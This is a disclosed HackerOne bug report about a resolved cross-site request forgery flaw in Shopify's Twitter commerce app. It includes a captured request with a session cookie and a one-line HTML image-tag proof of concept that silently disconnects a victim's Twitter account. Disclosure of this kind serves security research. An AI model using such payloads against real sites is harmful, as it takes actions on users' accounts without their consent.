---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '111216'
original_report_id: '111216'
title: Twitter Disconnect CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: shopify
created_at: '2016-01-17T10:08:02.158Z'
disclosed_at: '2016-02-01T20:46:21.843Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Twitter Disconnect CSRF

## Metadata

- HackerOne Report ID: 111216
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: shopify
- Disclosed At: 2016-02-01T20:46:21.843Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Hello,**

Using this CSRF vulnerability one could disconnect twitter account from their profiles.

**Vulnerable request**
```
GET /auth/twitter/disconnect HTTP/1.1
Host: twitter-commerce.shopifyapps.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://twitter-commerce.shopifyapps.com/account
Cookie: _twitter-commerce_session=bmpuTE5EdnUvYUU0eGxJRk1kMWo5WkI3Wmh1clJkempOTDcya2R3eFNIMG8zWGdpenMvTXY4eFczTWUrNGRQeXV4ZGVycEVtTDZWcFZVbEg1eEtFQjhzSEJVbkM5K05VUVJaeHVtNXBnNTJCNTdwZ2hLL0x0Kyt4eUVlSjRIOWdYTkcwd1NQWWJnbjRNaTF5UXlwa1ZIUlAwR1JmZ1Y5WmRvN2ZHWFY5REZSUmlsR0lnMHZlSjR1OTlTMW5xWDdZRnVGSnBSeEhqbWpNS3lYZmxBNjZoVE00L3pQT2NMd1NONkdwb2pkMXhDS1E2M2RXYlovZjYwaUZnV0JQKzQySlN0MTNKNG55Zlg2azFDdVJJL3RidmJMM0VJNmRVejhZbjVDTnFZNmxFN0k9LS1lY1Y2dnpBZTJCalZzS014SldFUllBPT0%3D--77463ef21e4c8ef530f466db49f78b8e1c2e1129; _ga=GA1.2.469272249.1453024796; _gat=1
Connection: keep-alive
```

**POC code:**
```
<html>
<body>
 <img src="https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect">
  </body>
</html>
```

**Steps to reproduce**
- Add twitter application at https://madamcury.myshopify.com/admin/apps/shopify-twitter
- Connect to your twitter account
- use the above poc code to disconnect the twitter account 


**Regards,
WeSecureApp**

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
